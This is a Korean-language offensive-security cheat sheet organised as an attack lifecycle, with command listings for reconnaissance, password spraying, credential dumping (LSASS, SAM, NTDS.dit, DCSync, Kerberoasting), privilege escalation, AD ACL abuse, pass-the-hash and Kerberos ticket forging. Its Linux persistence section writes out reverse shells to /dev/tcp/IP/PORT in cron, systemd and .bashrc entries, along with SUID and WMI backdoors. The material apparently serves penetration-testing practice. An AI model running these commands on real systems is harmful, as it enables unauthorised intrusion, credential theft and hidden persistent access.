# 공격 라이프사이클

---

## 정찰

### 능동 정찰

```bash
# 전체 포트 스캔
nmap -sS -Pn -n --open -p- --min-rate 5000 TARGET -oA tcp

# UDP 상위 포트
nmap -sU -Pn -n --open --top-ports 100 TARGET -oA udp

# 상세 스캔
nmap -sV -sC -Pn -n --open -p PORTS TARGET -oA detail

# 취약점 스캔
nmap -sV --script=vuln -p PORTS TARGET

# 디렉토리 열거
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -d 2

# 서브도메인
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE

# DNS zone transfer
dig axfr @DNS_SERVER DOMAIN
```

### 수동 정찰 (OSINT)

```bash
# 도메인 정보
whois DOMAIN
dig +short DOMAIN ANY

# 서브도메인 (수동)
subfinder -d DOMAIN -o subs.txt
amass enum -d DOMAIN -passive

# 이메일 수집
theHarvester -d DOMAIN -b all

# GitHub 검색
# org:company password / key / secret / token

# 구글 Dork
site:domain.com filetype:pdf
site:domain.com inurl:admin
site:domain.com intitle:"index of"
```

---

## 초기 침투

```bash
# Password Spray (잠금 정책 확인 후)
nxc smb DC_IP -u users.txt -p 'Password1!' --continue-on-success
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password1!'

# Anonymous/Null 접근
smbclient -L IP -N
ldapsearch -x -H ldap://IP -b "DC=domain,DC=local"
rpcclient -N -U '' IP

# 웹 취약점 → 쉘
# SQLi, LFI/RFI, File Upload, Command Injection, SSTI, Deserialization

# 피싱 (매크로)
# Office 매크로, .lnk, .hta, .iso/.img
# 참고: VBA 매크로는 기본 차단됨 (2022~)

# 이메일 주소 형식 유추
# {first}.{last}@domain.com
# {f}{last}@domain.com
# kerbrute 또는 SMTP RCPT TO로 검증
```

---

## 열거

### Windows (AD)

```bash
# AD 열거 (BloodHound)
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c all

# SMB 공유
nxc smb IP -u USER -p PASS --shares
smbmap -u USER -p PASS -H IP -R                # 재귀 목록

# 사용자/그룹
nxc ldap DC_IP -u USER -p PASS --users
nxc ldap DC_IP -u USER -p PASS --groups
rpcclient -U 'USER%PASS' IP -c 'enumdomusers;enumdomgroups'

# 서비스 확인
nxc smb IP -u USER -p PASS --services

# 로그온 사용자
nxc smb IP -u USER -p PASS --loggedon-users
nxc smb IP -u USER -p PASS --sessions
```

### Linux

```bash
# SUID / Capabilities
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# 네트워크
ss -tlnp                                       # 열린 포트
ip route                                       # 라우팅 테이블

# 사용자
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group

# 자동화
./linpeas.sh
./linux-smart-enumeration.sh -l 2
```

---

## 자격 증명 탈취

```bash
# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -no-pass

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request

# DCSync
impacket-secretsdump 'DOMAIN/USER:PASS@DC_IP'
impacket-secretsdump 'DOMAIN/USER:PASS@DC_IP' -just-dc-user Administrator

# LLMNR/NBT-NS Poisoning
sudo responder -I eth0

# LSASS 덤프
nxc smb TARGET -u admin -p PASS -M lsassy
# LOLBin (도구 불필요)
rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# SAM 덤프
nxc smb TARGET -u admin -p PASS --sam
reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# GPP 비밀번호
nxc smb DC -u USER -p PASS -M gpp_password

# NTDS.dit 덤프 (DC 전용)
nxc smb DC -u admin -p PASS --ntds
# diskshadow 방식 (직접)
echo "set context persistent nowriters" > cmd.txt
echo "add volume c: alias tmp" >> cmd.txt
echo "create" >> cmd.txt
echo "expose %tmp% z:" >> cmd.txt
diskshadow /s cmd.txt
robocopy /b z:\windows\ntds . ntds.dit
reg save HKLM\SYSTEM system.bak
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL

# DPAPI
cmdkey /list
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
# SharpDPAPI
.\SharpDPAPI.exe credentials /machine
.\SharpDPAPI.exe triage
# LaZagne (모든 credential 수집)
.\LaZagne.exe all

# Windows 자격 증명 검색
findstr /si "password" *.xml *.ini *.txt *.cfg
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cmdkey /list

# Linux 자격 증명 검색
cat /etc/shadow
find / -name id_rsa 2>/dev/null
cat ~/.bash_history
```

### 크래킹

```bash
hashcat -m 1000 ntlm.txt rockyou.txt        # NTLM
hashcat -m 13100 tgs.txt rockyou.txt         # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt       # AS-REP
hashcat -m 5600 ntlmv2.txt rockyou.txt       # NetNTLMv2
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule  # Rule
```

---

## 권한 상승

### Windows

```bash
whoami /priv
```

| 권한 | 공격 |
|------|------|
| SeImpersonatePrivilege | PrintSpoofer, GodPotato, JuicyPotatoNG |
| SeBackupPrivilege | SAM/SYSTEM 레지스트리 덤프 |
| SeDebugPrivilege | LSASS 메모리 접근 |
| SeTakeOwnershipPrivilege | 파일/레지스트리 소유권 획득 |

```bash
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

**서비스 악용:**

```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc config SERVICE binpath= "C:\temp\shell.exe"
sc stop SERVICE && sc start SERVICE
```

**그룹 기반:**

```bash
# DnsAdmins → DNS에 DLL 로드
dnscmd DC /config /serverlevelplugindll \\ATTACKER\share\dns.dll
sc \\DC stop dns && sc \\DC start dns

# Backup Operators → SAM/NTDS 접근
reg save HKLM\SAM C:\temp\sam.bak
```

### Linux

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null       # SUID
getcap -r / 2>/dev/null                       # Capabilities
cat /etc/crontab && ls -la /etc/cron.d/       # Cron
./linpeas.sh

# Kernel Exploit 워크플로
uname -a && cat /etc/os-release               # 커널 버전 확인
# → searchsploit "Linux Kernel X.X"
# DirtyPipe (CVE-2022-0847): Linux 5.8-5.16.11
# DirtyCow (CVE-2016-5195): Linux 2.x-4.8
# PwnKit (CVE-2021-4034): pkexec (대부분 Linux)

# NFS no_root_squash
cat /etc/exports                               # no_root_squash 여부 확인

# PATH Injection
echo $PATH
echo '/bin/bash' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH

# Writable /etc/passwd
openssl passwd -1 newpass
echo 'root2:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### AD ACL 남용

| 권한 | 공격 |
|------|------|
| GenericAll (User) | 비밀번호 변경, Shadow Credentials |
| GenericAll (Group) | 그룹에 사용자 추가 |
| GenericWrite | Targeted Kerberoasting (SPN 설정) |
| WriteDACL | 자신에게 DCSync 권한 부여 |
| WriteOwner | Owner 변경 → WriteDACL 체인 |
| ForceChangePassword | 비밀번호 강제 변경 |

```bash
# ForceChangePassword
bloodyAD -d DOMAIN -u USER -p PASS --host DC set password TARGET 'NewPass!'

# WriteDACL → DCSync
bloodyAD -d DOMAIN -u USER -p PASS --host DC add genericAll TARGET USER
impacket-dacledit -action write -rights DCSync DOMAIN/USER:PASS -dc-ip DC_IP

# GenericAll on Group
bloodyAD -d DOMAIN -u USER -p PASS --host DC add groupMember "Domain Admins" USER

# Shadow Credentials
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET$
```

---

## 횡적 이동

| 기법 | 포트 | 필요 권한 | OPSEC |
|------|------|----------|-------|
| PSExec | 445 | Local Admin | 낮음 (바이너리 드롭) |
| WMIExec | 135 | Local Admin | 중간 |
| SMBExec | 445 | Local Admin | 중간 (파일 없음) |
| Evil-WinRM | 5985 | Remote Mgmt Users | 중간 |
| DCOM | 135 | Local Admin | 중간 |
| RDP | 3389 | RDP Users | 낮음 |

```bash
# Pass-the-Hash
evil-winrm -i IP -u USER -H NTHASH
impacket-psexec USER@IP -hashes :NTHASH
impacket-wmiexec USER@IP -hashes :NTHASH
impacket-smbexec USER@IP -hashes :NTHASH

# 비밀번호
impacket-psexec DOMAIN/USER:'PASS'@IP

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec DOMAIN/USER@FQDN -k -no-pass

# RDP
xfreerdp /v:IP /u:USER /p:PASS /cert-ignore /dynamic-resolution

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\USER
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
```

---

## 지속성

### Windows

```bash
# Registry Run Key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NAME /t REG_SZ /d "PAYLOAD" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v NAME /t REG_SZ /d "PAYLOAD" /f

# Scheduled Task
schtasks /create /tn NAME /tr PAYLOAD /sc onlogon /ru SYSTEM
schtasks /create /tn NAME /tr PAYLOAD /sc minute /mo 30 /ru SYSTEM

# WMI Event Subscription
# 영구적 이벤트 (재부팅 후에도 유지)
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
  Name='Backdoor'; EventNameSpace='root\cimv2';
  QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 서비스 등록
sc create SVCNAME binpath= "C:\temp\payload.exe" start= auto
sc start SVCNAME

# DLL Hijacking (쓰기 가능한 PATH 경로)
# Missing DLL → 악성 DLL 배치
# procmon으로 NAME NOT FOUND 탐색

# Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache

# Silver Ticket (특정 서비스)
impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain DOMAIN -spn cifs/TARGET Administrator

# Diamond Ticket (탐지 회피)
.\Rubeus.exe diamond /krbkey:AES256_KEY /user:admin /enctype:aes /ticketuser:admin /domain:DOMAIN /dc:DC /ptt

# Skeleton Key (모의 마스터 키)
# LSASS에 패치 → 모든 사용자 "mimikatz" 비밀번호로 인증 가능
mimikatz# misc::skeleton
```

### Linux

```bash
# SSH 키
echo "PUBKEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1") | crontab -
echo "* * * * * root bash -i >& /dev/tcp/IP/PORT 0>&1" >> /etc/crontab

# SUID Backdoor
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor
# 실행: /tmp/.backdoor -p

# Systemd Service
cat > /etc/systemd/system/backdoor.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor && systemctl start backdoor

# PAM Backdoor
# pam_unix.so 수정하여 하드코딩 비밀번호 추가
# /etc/pam.d/ 설정 파일 조작

# .bashrc / .profile
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1 &' >> ~/.bashrc
```
